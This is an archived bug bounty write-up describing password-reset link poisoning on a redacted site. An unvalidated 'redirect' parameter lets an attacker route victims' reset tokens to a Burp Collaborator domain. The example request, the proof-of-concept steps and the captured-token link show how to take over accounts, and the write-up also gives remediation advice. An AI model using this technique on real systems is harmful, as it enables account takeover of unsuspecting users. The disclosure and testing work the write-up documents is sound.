# 🐛 Bug Bounty Writeup

- **Source URL:** https://bugwraith.medium.com/i-sent-one-http-request-and-hijacked-a-password-reset-link-ato-1f2d04de4d1b
- **Fetched from:** https://web.archive.org/web/20260912154506/https://bugwraith.medium.com/i-sent-one-http-request-and-hijacked-a-password-reset-link-ato-1f2d04de4d1b
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14888 (id 14888)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# I sent one HTTP request and hijacked a password reset link → ATO

A single “redirect” parameter, an attacker-controlled Collaborator domain, and a full account takeover. Welcome to another password reset logic bug.

Wait, What? You know that email you get when you forget your password? The one with a “Reset Password” button? Now imagine an attacker quietly swapping the domain in that link — before it even reaches your inbox — so that clicking it sends your reset token straight to them.

No phishing. No malware. No social engineering. Just one modified parameter.


That’s exactly what I found.

### **A Little Background:**

How Password Resets Work Most applications handle “forgot password” the same way:

1. You submit your email.
2. The server generates a unique reset token.
3. The server builds a reset link — usually your-app.com/reset?token=XYZ — and emails it to you.
4. You click it, land on the real site, and set a new password.

The link only works because it points back to the app’s own trusted domain. If that domain can be swapped by the person requesting the reset, the whole model breaks.

### **The Bug:**

Redirect-Controlled Reset Links While testing redacted.com’s password reset flow, I noticed the request body accepted a “redirect” parameter alongside the victim’s email:

```
POST /v2/auth/password/email
{ 
"email": "victim@example.com", 
"redirect": "https://redacted.com/en-us/?action=password_reset"
 }
```
Normal? On the surface, yes — plenty of apps let the frontend specify a post-reset landing page.

### **The problem?**

The server never validated that the redirect actually belonged to redacted.com. It trusted the value outright and stitched it directly into the reset link that got emailed to the victim.

So I pointed it somewhere else.

How I Found It (PoC) The steps were embarrassingly simple:

1. Intercept the password reset request in Burp Suite.
2. Replace the “redirect” value with a Burp Collaborator domain: [https://{collaborator-id}.oastify.com/en-us/?action=password\_reset](https://{collaborator-id}.oastify.com/en-us/?action=password_reset)

3\. Forward the request — the API responds normally, no validation error.

4\. The victim receives a legitimate-looking password reset email from redacted.com.

5\. The victim clicks the link. The request — reset token included — lands on the Collaborator server, not redacted.com.

6\. Burp Collaborator confirms the interaction and captures the token in the URL.

7\. Replay that token against the real reset endpoint.

8\. New password set. Account taken over.

### Example captured link:

`https://{collaborator-id}.oastify.com/en-us/?action=password_reset&t=TOKEN`
The token was sitting right there in the query string, delivered to a server I controlled — no MITM, no malware, just an unchecked field.

The **Real Impact** This isn’t a cosmetic redirect issue. Walk through what it actually enables:

- Full account takeover — capture the token, reset the password, own the account.
- Zero victim awareness — the email looks completely legitimate; the victim doesn’t need to notice anything is wrong beyond clicking a normal-looking link.
- No authentication required — the attacker only needs the victim’s email address to trigger the flow.
- Scriptable at volume — automate the request against any known or guessed email list, and passively wait for Collaborator hits.

The barrier to exploitation here was one parameter and a public reset form.

### What I Reported

- Endpoint: /v2/auth/password/email
- Asset: redacted.com
- Class: Account Takeover via Host Header / Redirect Parameter Poisoning
- Evidence submitted: full request/response pair, Collaborator interaction log confirming token capture, and a video PoC showing the end-to-end flow from reset request to account takeover.

### Recommendation given to the vendor:

- Never trust a user-supplied redirect/domain parameter when constructing reset links.
- Enforce a strict server-side allowlist of valid redirect domains.
- Build reset links exclusively from a hardcoded, trusted server-side origin — never from request input.
- Validate and sanitize every parameter that touches an outbound email template.

Takeaway for Bug Hunters If you’re testing password reset or email-based flows, always check:

- Does any parameter in the request influence the domain, host, or URL embedded in the outbound email?
- Does the server validate that value against an allowlist, or just trust it?
- Can you swap it for a Collaborator/Burp domain and capture a real token?
- Does the token appear in a GET request (query string), making it easy to leak via Referer headers or open redirects too?

Host header and redirect-parameter poisoning bugs are still everywhere in reset flows, because teams focus validation on the token itself and forget the delivery mechanism carrying it. The token can be cryptographically perfect — it doesn’t matter if the link delivering it can be redirected to your server.

Found something interesting? Connect with me on [LinkedIn](https://www.linkedin.com/in/lokesh-bugwrith/) or check out my other writeups.

— Lokesh
